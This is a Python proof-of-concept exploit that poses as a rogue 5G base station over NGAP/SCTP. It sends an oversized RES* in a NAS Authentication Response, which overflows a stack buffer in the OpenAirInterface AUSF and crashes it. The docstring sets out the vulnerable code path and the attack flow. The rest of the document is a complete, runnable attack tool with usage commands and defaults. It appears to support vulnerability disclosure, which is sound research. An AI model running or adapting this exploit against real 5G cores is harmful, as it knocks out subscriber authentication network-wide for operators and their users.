#!/usr/bin/env python3
"""PoC: OAI CN5G AUSF — Pre-Auth Stack Buffer Overflow via Oversized RES*
(CWE-121) delivered by a rogue gNB over NGAP/SCTP (5G-AKA confirmation).

This is the radio-side counterpart of ``udm_resync_overflow_poc.py``
(VUL-20260823): both crash an OAI NF through the very same unbounded
``conv::hex_str_to_uint8(const char* string, uint8_t* des)`` sink. That helper
converts an arbitrary-length hex string into a fixed-size stack buffer with
**no destination bounds parameter**. The UDM PoC reaches it directly over the
SBI; this PoC reaches it from the radio interface, pre-authentication, with a
single unauthenticated NAS message — no SIM keys, no credentials.

Root cause
----------
``oai-ausf`` 5G-AKA confirmation handler (``ausf_app.cpp``)::

    uint8_t res_star[16] = {0};                                  // expects 32 hex chars
    conv::hex_str_to_uint8(confirmation_data.getResStar().c_str(), res_star);  // OVERFLOW

The ``resStar`` value originates from the NAS *Authentication Response*
*Authentication response parameter* IE (RES*, IEI 0x2d). The AMF NAS decoder
performs **no maximum-length validation** and forwards the raw RES* hex string
to the AUSF via ``Nausf_UEAuthentication`` 5g-aka-confirmation. A 200-byte RES*
becomes a 400-char hex string → 200 bytes written into ``res_star[16]`` →
stack canary smashed → ``*** stack smashing detected ***`` → SIGABRT/exit 139.

Attack path (rogue gNB, no RAN authentication)
----------------------------------------------
    attacker gNB ──SCTP/NGAP──▶ oai-amf  (NGSetup accepted, no auth)
      ├─ InitialUEMessage : NAS Registration Request (SUCI, null-scheme)
      │        ▼ AMF → UDM/AUSF : auth vector request
      ◀── DownlinkNASTransport : NAS Authentication Request (RAND/AUTN)
      └─ UplinkNASTransport : NAS Authentication Response
             IEI 0x2d, len=200, RES* = 0x42×200        ← crafted, unauthenticated
                ▼ AMF hex-encodes resStar (400 chars), no length check
           POST /nausf-auth/v1/ue-authentications/{ctx}/5g-aka-confirmation
                ▼ oai-ausf : hex_str_to_uint8(400 hex → 200 bytes) into res_star[16]

Two crafted-NAS modes
---------------------
  res  (default) : Authentication Response, oversized RES*  (IEI 0x2d) → AUSF crash.
                   Radio-triggerable and reproduced; this is the working path.
  auts           : Authentication Failure (5GMM cause 21), oversized AUTS (IEI 0x30)
                   → the sibling UDM ``r_auts[14]`` sink. Kept for completeness, but
                   BLOCKED by the AMF NAS decoder (``AuthenticationFailureParameter``
                   enforces length == 14) before it is ever forwarded to the UDM.

Impact: AUSF process killed (DoS of all ongoing and new UE authentications
network-wide) from a single unauthenticated NAS message.

Flow: NGSetup → InitialUEMessage(Registration Request) → wait for
Authentication Request → UplinkNASTransport(crafted NAS).

Usage:
  python3 oai_auth_overflow_poc.py --host 172.30.0.7 --port 38412 --mode res
  python3 oai_auth_overflow_poc.py --host <AMF_NGAP_IP> --size 200

Environment / defaults match the reference deployment (PLMN 208-95, TAC 0x00a000,
S-NSSAI SST=222/SD=00007b, subscriber 208950000000031). Discover the AMF NGAP IP:
  docker inspect oai-amf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'

Requires: python3 + pysctp (``pip install pysctp``) + pycrate
(``pip install pycrate``). NGAP encoding via pycrate is byte-identical to the
free5gc Go library this PoC was ported from.
"""
import argparse
import errno
import select
import socket
import sys
import time

try:
    import sctp  # pysctp
except ImportError:
    sys.exit("[-] pysctp is required: pip install pysctp")

try:
    from pycrate_asn1dir import NGAP
except ImportError:
    sys.exit("[-] pycrate is required: pip install pycrate")

# Single shared NGAP PDU codec object (pycrate keeps state in set_val/from_aper).
PDU = NGAP.NGAP_PDU_Descriptions.NGAP_PDU

# ---- protocol constants -------------------------------------------------
NGAP_PPID = 60                    # NGAP PPID (TS 38.412)
# SCTP carries the PPID in network byte order, but pysctp passes sinfo_ppid to
# the kernel verbatim (host order) and returns it un-swapped on recv. The
# free5gc Go wrapper byte-swaps internally, so the Python port must do it here
# or the AMF rejects every DATA chunk with "unsolicited PPID" and never replies.
NGAP_PPID_NET = socket.htonl(NGAP_PPID)

# NGAP procedure codes
PROC_DOWNLINK_NAS_TRANSPORT = 4
PROC_INITIAL_UE_MESSAGE = 15
PROC_NG_SETUP = 21
PROC_UPLINK_NAS_TRANSPORT = 46

# NGAP ProtocolIE-IDs
IE_AMF_UE_NGAP_ID = 10
IE_GLOBAL_RAN_NODE_ID = 27
IE_NAS_PDU = 38
IE_RAN_UE_NGAP_ID = 85
IE_RRC_ESTABLISHMENT_CAUSE = 90
IE_SUPPORTED_TA_LIST = 102
IE_USER_LOCATION_INFORMATION = 121
IE_DEFAULT_PAGING_DRX = 21

# 5GMM NAS message types (TS 24.501)
NAS_AUTHENTICATION_REQUEST = 0x56
NAS_AUTHENTICATION_RESPONSE = 0x57
NAS_AUTHENTICATION_FAILURE = 0x59


# =========================================================================
# NAS builders (TS 24.501, plain / non-security-protected) — mirror main.go
# =========================================================================
def plmn_bcd(mcc, mnc):
    """Encode MCC/MNC in the NAS/TS 24.008 octet order (also used in SUCI)."""
    b = bytearray(3)
    b[0] = ((ord(mcc[1]) - 48) << 4) | (ord(mcc[0]) - 48)
    if len(mnc) == 2:
        b[1] = 0xf0 | (ord(mcc[2]) - 48)
        b[2] = ((ord(mnc[1]) - 48) << 4) | (ord(mnc[0]) - 48)
    else:
        b[1] = ((ord(mnc[2]) - 48) << 4) | (ord(mcc[2]) - 48)
        b[2] = ((ord(mnc[1]) - 48) << 4) | (ord(mnc[0]) - 48)
    return bytes(b)


def suci_mobile_identity(mcc, mnc, msin, routing="0000"):
    """Build a null-scheme SUCI 5GS mobile identity IE value (10-digit MSIN)."""
    if len(msin) != 10:
        sys.exit(f"[-] msin must be 10 digits, got {msin!r}")
    out = bytearray([0x01])                 # type of identity: SUCI
    out += plmn_bcd(mcc, mnc)
    out += bytes.fromhex(routing)
    out += bytes([0x00, 0x00])              # protection scheme: null, key id: 0
    for i in range(0, len(msin), 2):
        lo = ord(msin[i]) - 48
        hi = ord(msin[i + 1]) - 48
        out.append(lo | (hi << 4))
    return bytes(out)


def build_registration_request(mcc, mnc, msin, sst, sd):
    """Plain-NAS 5GMM Registration Request mirroring a working ueransim capture:
      7e 00 41 79 | 00 0d <SUCI 13B> | 2e 04 f0f0f0f0 | 2f 05 04 <sst> <sd>
    NB: OAI decodes the 5GS mobile identity as a Type6 IE with a 2-octet length
    and WITHOUT the spec's 0x77 IEI octet.
    """
    nas = bytearray([0x7e, 0x00, 0x41])     # EPD, plain sec header, Registration Request
    nas.append(0x79)                        # reg type + ngKSI (as sent by ueransim)
    mid = suci_mobile_identity(mcc, mnc, msin, "0000")
    nas += bytes([len(mid) >> 8, len(mid) & 0xff])
    nas += mid
    nas += bytes([0x2e, 0x04, 0xf0, 0xf0, 0xf0, 0xf0])   # UE security capability
    sd_b = bytes.fromhex(sd)
    nas += bytes([0x2f, 0x05, 0x04, sst, sd_b[0], sd_b[1], sd_b[2]])  # Requested NSSAI
    return bytes(nas)


def build_auth_response_res(res_len):
    """Plain-NAS Authentication Response with an oversized RES* (IEI 0x2d).
    This is the kill payload for the AUSF ``res_star[16]`` sink."""
    nas = bytearray([0x7e, 0x00, NAS_AUTHENTICATION_RESPONSE])
    nas += bytes([0x2d, res_len & 0xff])
    nas += bytes([0x42]) * res_len
    return bytes(nas)


def build_auth_failure_auts(auts_len):
    """Plain-NAS Authentication Failure (5GMM cause 21, synch failure) with an
    oversized AUTS IE (IEI 0x30) — the sibling UDM ``r_auts[14]`` sink.
    Blocked by the AMF NAS decoder (length must equal 14) on the radio path."""
    nas = bytearray([0x7e, 0x00, NAS_AUTHENTICATION_FAILURE])
    nas.append(0x15)                        # 5GMM cause 21: synch failure
    nas += bytes([0x30, auts_len & 0xff])
    nas += bytes([0x41]) * auts_len
    return bytes(nas)


# =========================================================================
# NGAP builders (pycrate APER) — byte-identical to free5gc ngap.Encoder
# =========================================================================
def build_ngsetup_request(mcc, mnc, tac, gnb_id, sst, sd):
    plmn = plmn_bcd(mcc, mnc)
    tac_bytes = bytes.fromhex("%06x" % tac)
    snssai = {"sST": bytes([sst])}
    if sd:
        snssai["sD"] = bytes.fromhex(sd)
    val = ("initiatingMessage", {
        "procedureCode": PROC_NG_SETUP,
        "criticality": "reject",
        "value": ("NGSetupRequest", {"protocolIEs": [
            {"id": IE_GLOBAL_RAN_NODE_ID, "criticality": "reject",
             "value": ("GlobalRANNodeID", ("globalGNB-ID", {
                 "pLMNIdentity": plmn,
                 "gNB-ID": ("gNB-ID", (gnb_id, 32))}))},
            {"id": IE_SUPPORTED_TA_LIST, "criticality": "reject",
             "value": ("SupportedTAList", [{
                 "tAC": tac_bytes,
                 "broadcastPLMNList": [{
                     "pLMNIdentity": plmn,
                     "tAISliceSupportList": [{"s-NSSAI": snssai}],
                 }],
             }])},
            {"id": IE_DEFAULT_PAGING_DRX, "criticality": "ignore",
             "value": ("PagingDRX", "v32")},
        ]})})
    PDU.set_val(val)
    return PDU.to_aper()


def build_initial_ue_message(mcc, mnc, tac, ran_ue_ngap_id, nas_pdu):
    plmn = plmn_bcd(mcc, mnc)
    tac_bytes = bytes.fromhex("%06x" % tac)
    val = ("initiatingMessage", {
        "procedureCode": PROC_INITIAL_UE_MESSAGE,
        "criticality": "ignore",
        "value": ("InitialUEMessage", {"protocolIEs": [
            {"id": IE_RAN_UE_NGAP_ID, "criticality": "reject",
             "value": ("RAN-UE-NGAP-ID", ran_ue_ngap_id)},
            {"id": IE_NAS_PDU, "criticality": "reject",
             "value": ("NAS-PDU", nas_pdu)},
            {"id": IE_USER_LOCATION_INFORMATION, "criticality": "reject",
             "value": ("UserLocationInformation", ("userLocationInformationNR", {
                 "nR-CGI": {"pLMNIdentity": plmn, "nRCellIdentity": (16, 36)},
                 "tAI": {"pLMNIdentity": plmn, "tAC": tac_bytes}}))},
            {"id": IE_RRC_ESTABLISHMENT_CAUSE, "criticality": "ignore",
             "value": ("RRCEstablishmentCause", "mo-Signalling")},
        ]})})
    PDU.set_val(val)
    return PDU.to_aper()


def build_uplink_nas_transport(amf_ue_ngap_id, ran_ue_ngap_id, nas_pdu):
    val = ("initiatingMessage", {
        "procedureCode": PROC_UPLINK_NAS_TRANSPORT,
        "criticality": "ignore",
        "value": ("UplinkNASTransport", {"protocolIEs": [
            {"id": IE_AMF_UE_NGAP_ID, "criticality": "reject",
             "value": ("AMF-UE-NGAP-ID", amf_ue_ngap_id)},
            {"id": IE_RAN_UE_NGAP_ID, "criticality": "reject",
             "value": ("RAN-UE-NGAP-ID", ran_ue_ngap_id)},
            {"id": IE_NAS_PDU, "criticality": "reject",
             "value": ("NAS-PDU", nas_pdu)},
        ]})})
    PDU.set_val(val)
    return PDU.to_aper()


# =========================================================================
# NGAP / NAS decode helpers
# =========================================================================
def is_successful_outcome(raw):
    """True if the NGAP PDU is a successfulOutcome (e.g. NGSetupResponse)."""
    try:
        PDU.from_aper(raw)
        return PDU.get_val()[0] == "successfulOutcome"
    except Exception:
        return False


def parse_downlink_nas(raw):
    """Return (amf_ue_ngap_id, nas_pdu) from a DownlinkNASTransport, else None."""
    try:
        PDU.from_aper(raw)
    except Exception:
        return None
    v = PDU.get_val()
    if v[0] != "initiatingMessage":
        return None
    im = v[1]
    if im["procedureCode"] != PROC_DOWNLINK_NAS_TRANSPORT:
        return None
    _name, content = im["value"]
    amf_id, nas = None, None
    for ie in content["protocolIEs"]:
        if ie["id"] == IE_AMF_UE_NGAP_ID:
            amf_id = ie["value"][1]
        elif ie["id"] == IE_NAS_PDU:
            nas = ie["value"][1]
    return amf_id, nas


def nas_type_of(b):
    """Return the 5GMM message type of a (possibly security-protected) NAS PDU."""
    if not b or len(b) < 7 or b[0] != 0x7e:
        return None
    sh = b[1] & 0x0f
    if sh == 0:                             # plain NAS
        return b[2] if len(b) >= 3 else None
    inner = b[7:]                           # protected: inner msg after 7-byte header
    if len(inner) >= 3 and inner[0] == 0x7e:
        return inner[2]
    return None


# =========================================================================
# SCTP transport (pysctp one-to-one, TCP-style) with PPID=60
# =========================================================================
def dial(host, port):
    """Open an SCTP association to the AMF NGAP endpoint. Returns (sock, fd)."""
    sock = sctp.sctpsocket_tcp(socket.AF_INET)
    sock.events.data_io = True              # subscribe to SndRcvInfo (to read PPID)
    sock._set_initparams({"_num_ostreams": 5, "_max_instreams": 5,
                          "_max_attempts": 4, "_max_init_timeo": 8})
    sock.settimeout(5.0)                    # connect timeout
    try:
        sock.connect((host, port))
    except socket.error as e:
        sys.exit(f"[-] SCTP connect to {host}:{port} failed: {e}")
    sock.settimeout(None)                   # blocking; reads driven by select()
    return sock, sock.fileno()


def send_msg(sock, data):
    sock.sctp_send(data, ppid=NGAP_PPID_NET)


def read_msg(sock, fd, timeout):
    """Read one NGAP (PPID=60) SCTP message within ``timeout`` seconds, or None."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return None
        r, _, _ = select.select([fd], [], [], min(remaining, 0.5))
        if not r:
            continue
        try:
            _fromaddr, _flags, msg, notif = sock.sctp_recv(65536)
        except (BlockingIOError, OSError) as e:
            if getattr(e, "errno", None) in (errno.EAGAIN, errno.EINTR):
                continue
            return None
        if not msg:
            return None
        ppid = getattr(notif, "ppid", None)
        if ppid is not None and ppid not in (NGAP_PPID, NGAP_PPID_NET):
            continue                        # skip non-NGAP PPIDs (either byte order)
        return msg


# =========================================================================
# main — mirrors the Go PoC's 4-step rogue-gNB flow
# =========================================================================
def main():
    ap = argparse.ArgumentParser(
        description="OAI CN5G AUSF pre-auth stack overflow via oversized RES* (rogue gNB NGAP).")
    ap.add_argument("--host", default="172.30.0.7", help="AMF NGAP IP (default: 172.30.0.7)")
    ap.add_argument("--port", type=int, default=38412, help="AMF NGAP SCTP port (default: 38412)")
    ap.add_argument("--mode", default="res", choices=["res", "auts"],
                    help="res = oversized RES* Auth Response (AUSF crash, default); "
                         "auts = oversized AUTS Auth Failure (UDM sink, blocked by AMF)")
    ap.add_argument("--mcc", default="208", help="PLMN MCC (default: 208)")
    ap.add_argument("--mnc", default="95", help="PLMN MNC (default: 95)")
    ap.add_argument("--msin", default="0000000031",
                    help="10-digit MSIN of a provisioned subscriber (default: 0000000031)")
    ap.add_argument("--tac", type=lambda x: int(x, 0), default=0xa000,
                    help="TAC matching AMF plmn_support_list (default: 0xa000)")
    ap.add_argument("--sst", type=lambda x: int(x, 0), default=222, help="S-NSSAI SST (default: 222)")
    ap.add_argument("--sd", default="00007b", help="S-NSSAI SD, hex (default: 00007b)")
    ap.add_argument("--gnbid", type=lambda x: int(x, 0), default=0x0adead,
                    help="rogue gNB ID (default: 0x0adead)")
    ap.add_argument("--size", type=int, default=200,
                    help="oversized AUTS/RES* length in bytes (default: 200; spec max 16 for RES*)")
    args = ap.parse_args()

    if args.size > 253:
        sys.exit("[-] size must be <= 253 (NAS IE length octet)")

    print(f"[*] OAI AUSF pre-auth stack overflow (oversized RES*) — rogue gNB NGAP injector")
    print(f"[*] Target AMF NGAP: {args.host}:{args.port} (SCTP, PPID={NGAP_PPID})")
    print(f"[*] Mode: {args.mode}  size: {args.size}  subscriber: {args.mcc}{args.mnc}{args.msin}")

    sock, fd = dial(args.host, args.port)
    print(f"[+] SCTP association to {args.host}:{args.port}")
    try:
        # 1. NGSetup
        ngsetup = build_ngsetup_request(args.mcc, args.mnc, args.tac,
                                        args.gnbid, args.sst, args.sd)
        send_msg(sock, ngsetup)
        resp = read_msg(sock, fd, 5.0)
        if resp is None:
            sys.exit("[-] no NGSetupResponse (timeout)")
        if not is_successful_outcome(resp):
            sys.exit(f"[-] NGSetup rejected (PLMN/TAC/NSSAI mismatch?): {resp.hex()}")
        print(f"[+] NGSetup accepted (rogue gNB {args.gnbid:08x}, no authentication)")

        # 2. InitialUEMessage with Registration Request (SUCI, null scheme)
        reg_req = build_registration_request(args.mcc, args.mnc, args.msin,
                                             args.sst, args.sd)
        iue = build_initial_ue_message(args.mcc, args.mnc, args.tac, 1, reg_req)
        send_msg(sock, iue)
        print(f"[+] InitialUEMessage sent: Registration Request SUCI "
              f"{args.mcc}{args.mnc}{args.msin} (null scheme)")

        # 3. Wait for Authentication Request (capture AMF-UE-NGAP-ID)
        amf_ue_ngap_id = -1
        deadline = time.time() + 15.0
        while time.time() < deadline:
            raw = read_msg(sock, fd, 2.0)
            if raw is None:
                break
            dl = parse_downlink_nas(raw)
            if dl is None:
                continue
            dl_amf_id, nas_pdu = dl
            if dl_amf_id is not None:
                amf_ue_ngap_id = dl_amf_id
            mt = nas_type_of(nas_pdu)
            if mt == NAS_AUTHENTICATION_REQUEST:
                print(f"[+] Authentication Request received (AMF-UE-NGAP-ID={amf_ue_ngap_id})")
                break
            print(f"[*] downlink NAS type "
                  f"{'0x%02x' % mt if mt is not None else '?'}, waiting for Authentication Request...")
        if amf_ue_ngap_id < 0:
            sys.exit("[-] never received Authentication Request — subscriber known? (check UDM/UDR)")

        # 4. Crafted NAS response
        if args.mode == "auts":
            nas_resp = build_auth_failure_auts(args.size)
            print(f"[+] Sending Authentication Failure: cause=21 (synch fail), "
                  f"AUTS len={args.size} (spec max 14)")
        else:
            nas_resp = build_auth_response_res(args.size)
            print(f"[+] Sending Authentication Response: RES* len={args.size} (spec max 16)")
        ul = build_uplink_nas_transport(amf_ue_ngap_id, 1, nas_resp)
        send_msg(sock, ul)
        print("[+] Oversized NAS payload delivered. AMF forwards to AUSF/UDM over SBI.")
        if args.mode == "auts":
            print("[+] Expected: oai-udm dies (stack overflow in handle_resynchronization: r_auts[14])")
        else:
            print("[+] Expected: oai-ausf dies (stack overflow in handle_confirmation: res_star[16])")
        print("[+] Verify: docker inspect oai-ausf --format '{{.State.Status}} ExitCode={{.State.ExitCode}}'"
              "  +  docker logs oai-ausf | tail -3")
        time.sleep(3.0)
    finally:
        sock.close()


if __name__ == "__main__":
    main()
